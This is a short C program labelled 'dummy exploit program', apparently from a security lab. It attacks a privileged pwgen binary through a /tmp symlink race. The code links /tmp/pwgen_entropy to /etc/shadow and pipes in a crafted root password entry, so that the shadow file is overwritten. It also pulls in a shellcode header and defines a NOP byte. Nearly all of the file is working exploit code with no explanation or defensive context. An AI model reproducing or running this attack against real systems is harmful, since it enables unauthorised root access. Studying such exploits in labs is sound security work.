/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define DBSIZE 562
#define DOFFSET 0
#define TARGET "/usr/local/bin/pwgen"
#define NOP   0x90


int main(int argc, char *argv[])
{
  FILE *fp,*tmpfile;
  int i;
   char changeshadow[] = "root:nVh3UuD38pTiY:16565::::::";
 

 

   tmpfile = fopen("/tmp/fakefile","w");
   fclose(tmpfile);

   symlink("/etc/shadow","/tmp/pwgen_entropy");
//  symlink("/tmp/fakefile","/tmp/pwgen_entrophy");
   fp = popen("/usr/local/bin/pwgen -e","w");
//   unlink("/tmp/pwgen_entrophy");
//   symlink("/etc/shadow","/tmp/pwgen_entropy");
   fprintf(fp, "\n%s", changeshadow); 
   fclose(fp);
//printf("%s %s %s",args[0], args[1],  args[2]);
  exit(0);
}
